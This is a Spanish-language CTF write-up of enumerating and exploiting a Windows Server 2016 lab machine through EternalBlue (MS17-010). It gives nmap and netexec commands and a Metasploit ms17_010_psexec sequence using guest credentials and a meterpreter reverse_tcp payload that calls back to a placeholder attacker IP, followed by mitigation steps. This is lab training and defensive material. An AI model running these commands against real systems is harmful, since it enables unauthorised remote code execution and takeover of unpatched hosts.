# Write-up CTF: Quokka (Explotación de CVE-2017-0143)

Este repositorio contiene la bitácora técnica de la fase de enumeración y explotación de una máquina Windows Server 2016 vulnerable a **EternalBlue** (CVE-2017-0143) durante un entorno de CTF.

## 📌 Información del Objetivo
* **Dirección IP:** `192.168.0.10`
* **Nombre de Host:** `WIN-VRU3GG3DPLJ` / `quokka.thl`
* **Sistema Operativo:** Windows Server 2016 Datacenter 14393 x64

---

## 1. Enumeración y Reconocimiento

### Escaneo General de Puertos (`nmap`)
Se ejecutó un escaneo completo de puertos TCP con detección de servicios y scripts por defecto:

```bash
nmap -sV -sC -p- -T4 -Pn 192.168.0.10
```

**Puertos clave descubiertos:**
* `80/tcp`: HTTP (Microsoft IIS 10.0) -> *Portfolio y Noticias Tech de Quokka*
* `139/tcp` y `445/tcp`: SMBv1/v2 (Microsoft-ds)

### Escaneo de Vulnerabilidades SMB
Al identificar el servicio SMB activo, se ejecutaron scripts específicos de Nmap para verificar fallas conocidas:

```bash
nmap -p 445 --script "smb-vuln-*" 192.168.0.10
```

**Resultado crítico:**
El host dio positivo para **MS17-010 (CVE-2017-0143)** con un factor de riesgo **HIGH (Remotely Code Execution)**.

---

## 2. Enumeración del Servicio SMB

Utilizando `netexec` (anteriormente CrackMapExec), validamos las versiones del protocolo y los permisos del recurso compartido con credenciales nulas/invitado:

```bash
netexec smb 192.168.0.10 -u 'guest' -p '' --shares
```

**Hallazgos clave:**
* **`SMBv1: True`**: Confirmación de que el protocolo vulnerable está activo.
* **`Signing: False`**: Firma de mensajes desactivada, facilitando ataques.
* **Acceso de Lectura/Escritura:** El recurso `Compartido` permite permisos `READ, WRITE` bajo la cuenta `guest`.

---

## 3. Explotación con Metasploit

Se inicia el marco de trabajo Metasploit para buscar el exploit correspondiente:

```bash
msfconsole
msf > search CVE-2017-0143
```

### Módulos recomendados para la intrusión:
Dado que el objetivo es un **Windows Server 2016**, el exploit tradicional de EternalBlue (`exploit/windows/smb/ms17_010_eternalblue`) puede ser inestable o no listar explícitamente la versión en sus *targets*. 

Para entornos de servidor modernos como Server 2016 que cuentan con recursos compartidos accesibles, se recomienda alternar con el módulo **psexec** aprovechando las credenciales de invitado obtenidas:

```bash
msf > use exploit/windows/smb/ms17_010_psexec
msf exploit(ms17_010_psexec) > set RHOSTS 192.168.0.10
msf exploit(ms17_010_psexec) > set SMBUser guest
msf exploit(ms17_010_psexec) > set SMBPass ""
msf exploit(ms17_010_psexec) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf exploit(ms17_010_psexec) > set LHOST <TU_IP_ATACANTE>
msf exploit(ms17_010_psexec) > exploit
```

---

## 🛠️ Mitigación (Para entornos de Producción)
1. Instalar de inmediato el parche de seguridad de Microsoft **MS17-010**.
2. Deshabilitar por completo el protocolo obsoleto **SMBv1** en el registro del sistema.
3. Habilitar la firma de comunicación SMB (*SMB Signing Mandatory*).
